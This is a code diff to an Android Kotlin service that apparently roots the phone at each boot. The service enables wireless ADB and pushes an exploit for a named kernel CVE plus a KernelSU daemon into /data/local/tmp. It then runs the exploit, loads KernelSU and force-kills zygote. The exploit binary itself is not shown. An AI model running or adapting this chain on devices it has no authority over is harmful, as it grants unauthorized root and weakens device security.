@@ -9,7 +9,6 @@ import android.content.Intent
 import android.content.pm.ServiceInfo
 import android.os.Build
 import android.os.IBinder
-import android.os.SystemClock
 import androidx.core.app.NotificationCompat
 import java.io.File
 import kotlinx.coroutines.CoroutineScope
@@ -56,21 +55,8 @@ class RootOnBootService : Service() {
     private fun runRootOnBoot() {
         updateNotification(getString(R.string.boot_notification_running))
 
-        // 1. Enable wireless debugging
-        if (!AdbPairing.isWirelessAdbEnabled(this)) {
-            check(AdbPairing.enableWirelessAdb(this)) {
-                "Could not enable wireless debugging (WRITE_SECURE_SETTINGS missing?)"
-            }
-        }
-
-        // 2. Discover the wireless-debugging connect port via mDNS
-        val port = discoverPortWithRetry()
-        check(port > 0) { "Wireless debugging connect port not found via mDNS" }
-
-        // 3. Connect via STLS
-        val keyManager = AdbKeyManager(this)
-        val client = LocalAdbClient("127.0.0.1", port, keyManager)
-        client.connect()
+        // 1-3. Enable wireless debugging, discover port, connect (shared session).
+        val adb = WirelessAdbSession.open(this)
 
         // 4. Resolve target and stage payloads
         val profile = PayloadRepository(this).resolveTarget(DeviceSnapshot.current())
@@ -86,11 +72,14 @@ class RootOnBootService : Service() {
         val remoteHelper = "/data/local/tmp/cve-2026-43499-root"
         val remoteKsud = "/data/local/tmp/ksud-s25u-kdp"
 
-        client.push(exploit, remoteExploit)
-        client.push(rootHelper, remoteHelper)
-        client.push(ksud, remoteKsud)
+        adb.push(exploit, remoteExploit, executable = true)
+        adb.push(rootHelper, remoteHelper, executable = true)
+        adb.push(ksud, remoteKsud, executable = true)
 
-        // 5. Run the exploit (one attempt per boot)
+        // 5. Run the exploit (one attempt per boot) in a streaming shell that
+        // stays open for the full run — adbd kills a backgrounded process the
+        // moment its shell stream closes, and the helper streams the live log
+        // to stdout via a foreground supervisor.
         val exploitCmd = buildString {
             append("SLIDE_SOURCE=tracefs ")
             append("EXPLOIT_ATTEMPTS=1 ")
@@ -98,29 +87,34 @@ class RootOnBootService : Service() {
             append("EXPLOIT_ATTEMPT_TIMEOUT_SEC=600 ")
             append("$remoteHelper --run-payload $remoteExploit $remoteHelper /data/local/tmp/f946b.log")
         }
-        val exploitResult = client.shell(exploitCmd)
-        check(exploitResult.output.contains("exploit completed") || exploitResult.output.contains("slide-kaslr-ok")) {
-            "Exploit did not succeed this boot: ${exploitResult.output.takeLast(200)}"
+        val exploitOutput = adb.runStreaming(exploitCmd) { }
+        check(exploitOutput.contains("exploit completed")) {
+            "Exploit did not succeed this boot: ${exploitOutput.takeLast(200)}"
         }
 
         // 6. Load KernelSU
-        val lateLoad = client.shell("$remoteHelper --late-load")
+        val lateLoad = adb.shell("$remoteHelper --late-load")
         check(lateLoad.exitCode == 0) { "KernelSU late-load failed: ${lateLoad.output}" }
 
-        // 7. Mount modules + restart zygote
-        client.shell("/data/adb/ksu/bin/ksud module mount")
-        client.shell("setprop ctl.restart zygote")
-        client.close()
-    }
-
-    private fun discoverPortWithRetry(timeoutMs: Long = 60_000): Int {
-        val deadline = SystemClock.elapsedRealtime() + timeoutMs
-        while (SystemClock.elapsedRealtime() < deadline) {
-            val port = AdbPairing.discoverConnectPort(this, timeoutMs = 10_000)
-            if (port > 0) return port
-            Thread.sleep(3_000)
+        // 7. Activate modules + restart zygote. Prefer `su -c` (persists under
+        // Enforcing once shell has been granted root by KernelSU); fall back
+        // to the daemon apply-modules path while SELinux is still permissive.
+        val suCheck = adb.shell("su -c id 2>&1")
+        if (suCheck.exitCode == 0 && suCheck.output.contains("uid=0")) {
+            adb.shell("su -c '/data/adb/ksud post-fs-data 2>&1 | tail -1'")
+            adb.shell("su -c '/data/adb/ksud services 2>&1 | tail -1'")
+            adb.shell("su -c '/data/adb/ksud boot-completed 2>&1 | tail -1'")
+            adb.shell("su -c 'for p in \$(pidof zygote64) \$(pidof zygote); do kill -9 \$p 2>/dev/null; done; echo zygote-killed'")
+        } else {
+            val apply = adb.shell("$remoteHelper --apply-modules")
+            if (apply.exitCode != 0) {
+                adb.shellAsRoot(
+                    "for p in \$(pidof zygote64) \$(pidof zygote); do kill -9 \$p 2>/dev/null; done; echo killed",
+                    helperPath = remoteHelper,
+                )
+            }
         }
-        return -1
+        adb.close()
     }
 
     private fun startInForeground() {
